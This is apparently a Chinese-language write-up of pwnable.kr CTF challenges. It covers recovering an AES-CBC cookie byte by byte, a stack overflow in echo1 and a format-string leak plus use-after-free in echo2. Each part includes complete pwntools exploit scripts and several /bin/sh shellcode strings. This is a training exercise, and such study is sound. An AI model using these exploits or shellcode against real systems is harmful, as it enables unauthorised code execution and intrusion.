    if hashlib.sha256(id+cookie).hexdigest() == pw and id == 'guest':
        return 1
    if hashlib.sha256(id+cookie).hexdigest() == pw and id == 'admin':
        return 2
    return 0

server = SimpleXMLRPCServer(("localhost", 9100))  # 创建一个绑定到本机地址和端口9100的XML-RPC协议服务器实例
print "Listening on port 9100..."
server.register_function(authenticate, "authenticate")  # 注册authenticate函数，以便通过XML-RPC远程调用
server.serve_forever()  # 服务器无限期运行, 并打印一条消息表示服务器正在监听端口9100


┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ cat ./client.py
#!/usr/bin/python
from Crypto.Cipher import AES
import base64
import os, sys
import xmlrpclib
rpc = xmlrpclib.ServerProxy("http://localhost:9100/")

BLOCK_SIZE = 16   # AES加密的块大小
PADDING = '\x00'  # AES加密的填充字符
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING  # 使用PADDING填充字符串s, 以确保其长度是BLOCK_SIZE的倍数
EncodeAES = lambda c, s: c.encrypt(pad(s)).encode('hex')  # 接受AES密码c, 对消息s进行填充加密并返回16进制加密数据
DecodeAES = lambda c, e: c.decrypt(e.decode('hex'))  # 接受AES密码c, 对消息e进行解密并返回解密数据

# server's secrets
key = 'erased. but there is something on the real source code'
iv = 'erased. but there is something on the real source code'
cookie = 'erased. but there is something on the real source code'

# guest / 8b465d23cb778d3636bf6c4c5e30d031675fd95cec7afea497d36146783fd3a1
# 该函数用于对输入进行验证, 遍历参数arg的每个字符, 如果其中有任何字符不属于允许的字符集合（包括小写字母、数字、短横线和下划线）则返回 False; 否则返回True
def sanitize(arg):
    for c in arg:
        if c not in '1234567890abcdefghijklmnopqrstuvwxyz-_':
            return False
    return True
# 使用密码块链接（CBC）模式执行AES-128解密, 接受消息msg,使用提供的key和初始化向量iv创建AES密码对象，解密消息并在返回解密数据之前删除填充字符
def AES128_CBC(msg):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return EncodeAES(cipher, msg)
# 该函数用于发送身份验证请求给服务器, 将参数id和pw与服务器的cookie组合成一个数据包, 使用AES128_CBC函数对数据包进行加密, 并将加密的数据包作为参数调用rpc.authenticate方法来向服务器发送请求, 最后返回服务器的响应结果
def request_auth(id, pw):
    packet = '{0}-{1}-{2}'.format(id, pw, cookie)
    e_packet = AES128_CBC(packet)
    print 'sending encrypted data ({0})'.format(e_packet)
    sys.stdout.flush()
    return rpc.authenticate(e_packet)

if __name__ == '__main__':
    print '---------------------------------------------------'
    print '-       PWNABLE.KR secure RPC login system        -'
    print '---------------------------------------------------'
    print ''
    print 'Input your ID'
    sys.stdout.flush()
    id = raw_input()
    print 'Input your PW'
    sys.stdout.flush()
    pw = raw_input()
	# 验证输入的id和pw是否符合要求, 如果不符合则打印错误消息并退出程序。
    if sanitize(id) == False or sanitize(pw) == False:
        print 'format error'
        sys.stdout.flush()
        os._exit(0)

    cred = request_auth(id, pw)

    if cred==0 :
        print 'you are not authenticated user'
        sys.stdout.flush()
        os._exit(0)
    if cred==1 :
        print 'hi guest, login as admin'
        sys.stdout.flush()
        os._exit(0)

    print 'hi admin, here is your flag'
    print open('flag').read()
    sys.stdout.flush()
```

我们需要管理员的密码来获取`flag`，即`hashlib.sha256(id+cookie).hexdigest()`。已知`id`是`admin`，只要求出`cookie`就能知道密码。程序使用`AES128_CBC`的加密模式，这种加密方式容易受到字节反转攻击，然而字节反转攻击需要响应中有解密出来的明文，在这里无法使用。由于`AES128_CBC`是对称加密方法，明文和密文的字节是一一对应的，并且这道题目中cookie的字符由小写字母、数字、短横线和下划线组成，因此它是可控的、可以爆破出来的。具体方法是：控制要加密的明文中`cookie`前面的字符数量，使要爆破的字节刚好位于分组中的最后一组的最后一个字节。接下来爆破方法是，每次改变最后一个字节，并把客户端返回的对应分组的加密密文与没有改变时的加密密文对比，当相等时说明该字节就是对应的`cookie`字节，如此爆破下去直到找到完整的`cookie`。

计算出`cookie`是`you_will_never_guess_this_sugar_honey_salt_cookie`后，就很容易算出正确的`pw`。

`pw = hashlib.sha256(id+cookie).hexdigest() = fcf00f6fc7f66ffcfec02eaf69d30398b773fa9b2bc398f960784d60048cc503`

```python
from pwn import *

def getRealEPack(ID,PW):
    io = remote('localhost',9006)
    io.recvuntil(b'ID\n')
    io.sendline(ID.encode())
    io.recvuntil(b'PW\n')
    io.sendline(PW.encode())
    s = io.recvline().decode()
    e_pack = s[s.find('(')+1:-2]
    io.close()
    return e_pack


def getCookie(guess):
    for i in range(2,100):
        pack = '-'*(15-i%16)+'--'+guess
        for j in '1234567890abcdefghijklmnopqrstuvwxyz-_!':
            e_pack0 = getRealEPack(pack+j,'')
            e_pack1 = getRealEPack('-'*(15-i%16),'')
            if e_pack0[:len(pack+j)*2] == e_pack1[:len(pack+j)*2]:
                guess += j
                print(guess)
                break
            if j == '!':
                return guess


def getflag(cookie):
    io = remote('localhost',9006)
    id = 'admin'
    io.sendlineafter(b'Input your ID\n', id)
    pw = hashlib.sha256(id+cookie).hexdigest()
    io.sendlineafter(b'Input your PW\n', pw)
    log.success('ID: {}\nPW: {}'.format(id,term.text.bold_italic_yellow(pw)))
    io.recvuntil(b'hi admin, here is your flag\n')
    flag = io.recvline().decode().strip()
    io.close()
    return flag


context.log_level = 'error'
cookie = getCookie('')  # 'you_will_never_guess_this_sugar_honey_salt_cookie'
context.log_level = 'info'
log.success('Cookie: {}'.format(cookie))
flag = getflag(cookie)
log.success('Flag: {}'.format(term.text.bold_italic_yellow(flag)))
```

由于网络响应较慢，我们可以利用之前题目的`ssh`账号密码将本题的`exploit.py`上传到系统中，以更快地执行代码。

```python
from pwn import *

shell = ssh(user='col', host='pwnable.kr', port=2222, password='guest')
exploit = shell.upload_file("exploit.py", "/tmp/exp.py")
# io = shell.process(["python", exploit], raw=False)
```

`SSH`进入系统运行`exploit.py`很丝滑地拿到`flag`：`byte to byte leaking against block cipher plaintext is fun!!`。

```bash
syscall@pwnable:~$ python /tmp/exp.py
y
yo
you
you_
you_w
you_wi
you_wil
you_will
you_will_
you_will_n
you_will_ne
you_will_nev
you_will_neve
you_will_never
you_will_never_
you_will_never_g
you_will_never_gu
you_will_never_gue
you_will_never_gues
you_will_never_guess
you_will_never_guess_
you_will_never_guess_t
you_will_never_guess_th
you_will_never_guess_thi
you_will_never_guess_this
you_will_never_guess_this_
you_will_never_guess_this_s
you_will_never_guess_this_su
you_will_never_guess_this_sug
you_will_never_guess_this_suga
you_will_never_guess_this_sugar
you_will_never_guess_this_sugar_
you_will_never_guess_this_sugar_h
you_will_never_guess_this_sugar_ho
you_will_never_guess_this_sugar_hon
you_will_never_guess_this_sugar_hone
you_will_never_guess_this_sugar_honey
you_will_never_guess_this_sugar_honey_
you_will_never_guess_this_sugar_honey_s
you_will_never_guess_this_sugar_honey_sa
you_will_never_guess_this_sugar_honey_sal
you_will_never_guess_this_sugar_honey_salt
you_will_never_guess_this_sugar_honey_salt_
you_will_never_guess_this_sugar_honey_salt_c
you_will_never_guess_this_sugar_honey_salt_co
you_will_never_guess_this_sugar_honey_salt_coo
you_will_never_guess_this_sugar_honey_salt_cook
you_will_never_guess_this_sugar_honey_salt_cooki
you_will_never_guess_this_sugar_honey_salt_cookie
[+] Cookie: you_will_never_guess_this_sugar_honey_salt_cookie
[+] Opening connection to localhost on port 9006: Done
[+] ID: admin
    PW: fcf00f6fc7f66ffcfec02eaf69d30398b773fa9b2bc398f960784d60048cc503
[*] Closed connection to localhost port 9006
[+] Flag: byte to byte leaking against block cipher plaintext is fun!!
```

------

### echo1

这是**Pwnable.kr**的第三十三个挑战`echo1`，来自**[Rookiss]**部分。

```bash
Pwn this echo service.

download : http://pwnable.kr/bin/echo1

Running at : nc pwnable.kr 9010
```

这题只给出一个二进制文件`echo1`，让我们下载看看文件信息。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ wget http://pwnable.kr/bin/echo1 

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ sudo chmod +x ./echo1

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ file ./echo1      
./echo1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fa367b7e8f66b68737a56333996d80f0d72e54ea, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ checksec --file=./echo1 
[*] '/home/tyd/ctf/pwn/pwnable.kr/echo1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

用`IDA Pro 64bit`打开二进制文件`echo1`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // rax
  unsigned int i; // [rsp+Ch] [rbp-24h] BYREF
  _QWORD v6[4]; // [rsp+10h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  o = malloc(0x28uLL);
  *((_QWORD *)o + 3) = greetings;
  *((_QWORD *)o + 4) = byebye;
  printf("hey, what's your name? : ");
  __isoc99_scanf("%24s", v6);
  v3 = o;
  *(_QWORD *)o = v6[0];
  v3[1] = v6[1];
  v3[2] = v6[2];
  id = v6[0];
  getchar();
  func[0] = (__int64)echo1;
  qword_602088 = (__int64)echo2;
  qword_602090 = (__int64)echo3;
  for ( i = 0; i != 121; i = getchar() )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ");
        __isoc99_scanf("%d", &i);
        getchar();
        if ( i > 3 )
          break;
        ((void (*)(void))func[i - 1])();
      }
      if ( i == 4 )
        break;
      puts("invalid menu");
    }
    cleanup();
    printf("Are you sure you want to exit? (y/n)");
  }
  puts("bye");
  return 0;
}
```

根据题目名称选择`echo1`，该函数调用`get_input()`从标准输入中读取`128`个字节到大小为`0x20`字节的`char`型数组`s`，存在栈溢出漏洞，可以先用`0x20+0x8`个`padding`进行填充。

```c
__int64 echo1()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  (*((void (__fastcall **)(void *))o + 3))(o);
  get_input(s, 128LL);
  puts(s);
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```

`id`位于`.bss`段上，我们第一次输入可以写入`jmp rsp`，这样在`leave; retn;`后能通过`rsp`跳转到`shellcode`，构造`payload`时可以``cyclic(0x20+0x8) + p64(id_addr) + shellcode`。

```assembly
.bss:0000000000602098 o               dq ?                    ; DATA XREF: echo1+8↑r
.bss:0000000000602098                                         ; echo1+13↑r ...
.bss:00000000006020A0                 public id
.bss:00000000006020A0 id              dd ?                    ; DATA XREF: main+C5↑w
```

至于为什么要写入`jmp rsp`，通过调试可以清楚地显示。

```assembly
────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
   0x40085f       <echo1+71>    mov    rax, qword ptr [rip + 0x201832] <0x602098>
   0x400866       <echo1+78>    mov    rdi, rax
   0x400869       <echo1+81>    call   rdx
 
   0x40086b       <echo1+83>    mov    eax, 0
   0x400870       <echo1+88>    leave  
 ► 0x400871       <echo1+89>    ret             <0x6020a0; id>
    ↓
   0x6020a0       <id>          jmp    rsp
    ↓
   0x7fffce3ed600               push   rax
   0x7fffce3ed601               xor    rdx, rdx
   0x7fffce3ed604               xor    rsi, rsi
   0x7fffce3ed607               movabs rbx, 0x68732f2f6e69622f
──────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────
00:0000│ rsp  0x7fffce3ed5f8 —▸ 0x6020a0 (id) ◂— jmp    rsp /* 0xe4ff */
01:0008│      0x7fffce3ed600 ◂— 0x48f63148d2314850
02:0010│      0x7fffce3ed608 ◂— 0x732f2f6e69622fbb
03:0018│      0x7fffce3ed610 ◂— 0x50f3bb05f545368
04:0020│      0x7fffce3ed618 —▸ 0x40000a ◂— add    byte ptr [rax], al
05:0028│      0x7fffce3ed620 —▸ 0x7fffce3ed710 ◂— 0x1
06:0030│      0x7fffce3ed628 ◂— 0x0
07:0038│      0x7fffce3ed630 —▸ 0x400a90 (__libc_csu_init) ◂— mov    qword ptr [rsp - 0x28], rbp
```

构造`shellcode`时可以参考我在 [**Linux ShellCode总结**](https://github.com/Don2025/CTFwriteUp/blob/main/Notes/Linux%20ShellCode%E6%80%BB%E7%BB%93.md) 中写的64位汇编代码，编写`Python`代码求解，拿到`shell`后输入`cat flag`即可得到`H4d_som3_fun_w1th_ech0_ov3rfl0w`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwnable.kr', 9010)
id_addr = 0x6020a0
io.sendlineafter(b' : ', asm('jmp rsp'))
io.sendlineafter(b'> ', b'1')
shellcode = b'H1\xf6\xf7\xe6PH\xbb/bin//shST_\xb0;\x0f\x05'
# 这些shellcode都能打通
# shellcode = b'\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05'
# shellcode = b'H1\xf6\xf7\xe6H\xbb/bin/sh\x00ST_\xb0;\x0f\x05'
# shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
# shellcode = b'H1\xffH1\xf6H1\xd2H1\xc0PH\xbb/bin//shSH\x89\xe7\xb0;\x0f\x05'
payload = cyclic(0x20+0x8) + p64(id_addr) + shellcode
io.sendline(payload)
io.interactive()
```

------

### echo2

这是**Pwnable.kr**的第三十四个挑战`echo2`，来自**[Rookiss]**部分。

```bash
Pwn this echo service.

download : http://pwnable.kr/bin/echo2

Running at : nc pwnable.kr 9011
```

这题只给出一个二进制文件`echo2`，让我们下载看看文件信息。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ wget http://pwnable.kr/bin/echo2

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ sudo chmod +x ./echo2

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ file ./echo2         
./echo2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4edd53a788f83abbdd5c911fc2a96fd6c5d42897, not stripped
                                                                                                          
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ checksec --file=./echo2
[*] '/home/tyd/ctf/pwn/pwnable.kr/echo2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

用`IDA Pro 64bit`打开二进制文件`echo2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // rax
  unsigned int i; // [rsp+Ch] [rbp-24h] BYREF
  _QWORD v6[4]; // [rsp+10h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  o = malloc(0x28uLL);
  *((_QWORD *)o + 3) = greetings;
  *((_QWORD *)o + 4) = byebye;
  printf("hey, what's your name? : ");
  __isoc99_scanf("%24s", v6);
  v3 = o;
  *(_QWORD *)o = v6[0];
  v3[1] = v6[1];
  v3[2] = v6[2];
  id = v6[0];
  getchar();
  func[0] = (__int64)echo1;
  qword_602088 = (__int64)echo2;
  qword_602090 = (__int64)echo3;
  for ( i = 0; i != 121; i = getchar() )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ");
        __isoc99_scanf("%d", &i);
        getchar();
        if ( i > 3 )
          break;
        ((void (*)(void))func[i - 1])();
      }
      if ( i == 4 )
        break;
      puts("invalid menu");
    }
    cleanup();
    printf("Are you sure you want to exit? (y/n)");
  }
  puts("bye");
  return 0;
}
```

根据题目名称选择`echo2`，该函数存在格式化字符串漏洞，我们可以利用该漏洞读写任意`8`字节内存地址。

```c
__int64 echo2()
{
  char format[32]; // [rsp+0h] [rbp-20h] BYREF

  (*((void (__fastcall **)(void *))o + 3))(o);
  get_input(format, 32LL);
  printf(format);
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```

继续审计`echo3`，`echo3`函数能配合`main`函数中的溢出逻辑缺陷来制作`UAF`漏洞，我们选择选项`4`退出时，程序会执行`cleanup()`函数，该函数会执行`free(o)`释放掉之前申请的`0x28`字节的内存空间，接着程序又会询问是否确认退出，如果选否的话又会回到`main`函数的主逻辑继续执行。而`echo3`函数申请了`0x20`大小的堆空间，根据`glibc`的堆管理策略，这次申请的堆会直接使用上次释放的堆块，这样如果覆盖了第`4`个`8`字节就会导致后面执行`(*((void (__fastcall **)(void *))o + 3))(o);`时执行我们覆盖的地址。

```c
__int64 echo3()
{
  char *s; // [rsp+8h] [rbp-8h]

  (*((void (__fastcall **)(void *))o + 3))(o);
  s = (char *)malloc(0x20uLL);
  get_input(s, 32LL);
  puts(s);
  free(s);
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```

整体思路是向`v6`处写入`shellcode`，利用`printf`格式化字符串漏洞泄露栈地址后计算出`v6`的地址，之后利用`UAF`漏洞跳转到`v6`执行。

编写`Python`代码求解，拿到`shell`后输入`cat flag`即可得到`fun_with_UAF_and_FSB :)`。

```python
from pwn import *

io = remote('pwnable.kr', 9011)
select_menu = lambda choice: io.sendlineafter(b'> ', str(choice).encode())
input_name = lambda name: io.sendlineafter(b"what's your name? : ", name)
shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
# 以下这俩个shellcode也能打通
# shellcode = b'H1\xf6\xf7\xe6PH\xbb/bin//shST_\xb0;\x0f\x05'
# shellcode = b'H1\xf6\xf7\xe6H\xbb/bin/sh\x00ST_\xb0;\x0f\x05'
input_name(shellcode)
select_menu(2)
io.recvline()  # hello
io.sendline(b'%10$p')
addr = int(io.recvline().strip(), 16)-0x20
select_menu(4)
io.sendlineafter(b'(y/n)', b'n')  # Are you sure you want to exit? (y/n)
select_menu(3)
io.recvline()  # hello 
payload = cyclic(24) + p64(addr)
io.sendline(payload)
io.interactive()
```

------

